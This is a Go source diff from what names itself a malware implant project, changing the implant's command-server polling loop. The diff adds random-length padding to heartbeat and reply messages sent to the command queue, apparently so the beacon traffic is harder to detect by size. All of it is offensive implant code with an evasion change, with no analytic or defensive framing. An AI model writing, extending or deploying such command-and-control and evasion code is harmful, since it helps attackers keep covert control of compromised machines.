@@ -12,6 +12,7 @@ import (
 	pb "malware/common/messages"
 	"malware/common/types"
 	"malware/implant/included_modules"
+	"math/rand"
 	"os"
 	"time"
 )
@@ -32,8 +33,11 @@ func (settings settings) doConnection() {
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
 
-	heartbeat := &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}
-	reply, err := client.CheckCommandQueue(ctx, &pb.CheckCmdRequest{Message: heartbeat})
+	heartbeat := &pb.CheckCmdRequest{Message: &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}}
+
+	heartbeat.RandomPadding = make([]byte, rand.Intn(100)+1)
+	rand.Read(heartbeat.RandomPadding)
+	reply, err := client.CheckCommandQueue(ctx, heartbeat)
 
 	if err != nil {
 		return
@@ -57,7 +61,11 @@ func (settings settings) doConnection() {
 		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 		defer cancel()
 
-		client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
+		msg := &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}}
+		msg.RandomPadding = make([]byte, rand.Intn(100)+1)
+		rand.Read(msg.RandomPadding)
+
+		client.CheckCommandQueue(ctx, msg)
 	}
 
 	if reply.GetListmodules() != nil {
